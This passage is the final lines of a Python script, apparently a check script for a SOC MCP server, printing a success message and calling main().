    print("\nAll SOC MCP server checks passed.")


if __name__ == "__main__":
    main()
